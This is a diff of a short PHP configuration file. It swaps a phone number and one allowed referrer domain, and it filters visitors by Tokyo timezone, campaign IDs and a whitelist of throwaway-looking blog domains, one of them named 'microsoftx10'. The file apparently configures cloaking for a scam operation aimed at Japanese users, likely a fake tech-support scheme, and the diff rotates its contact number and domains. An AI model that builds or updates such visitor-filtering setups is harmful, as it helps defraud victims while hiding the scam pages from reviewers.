@@ -1,5 +1,5 @@
 <?php
-$number = '0101-855-654-0113';
+$number = '0101-551-688-3524';
 $dynamic_url = "https://wavesofjapanblog.site";
 #$dynamic_url = "http://127.0.0.1:800";
 
@@ -7,7 +7,7 @@ $dynamic_url = "https://wavesofjapanblog.site";
 
 $allowed_timezones = ['Asia/Tokyo'];
 $allowed_campaign_ids = ['12345', '67890'];
-$allowed_referrer = ['http://127.0.0.1', 'http://127.0.0.1:81', 'https://sunaloomblog.space','https://samuraispoon.space','https://discovernipponblog.site', 'https://microsoftx10.onrender.com'];
+$allowed_referrer = ['http://127.0.0.1', 'http://127.0.0.1:81', 'https://sunaloomblog.space','https://samuraispoon.space','https://discovernipponblog.site', 'https://main.d2eu7g0wx49b77.amplifyapp.com'];
 
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
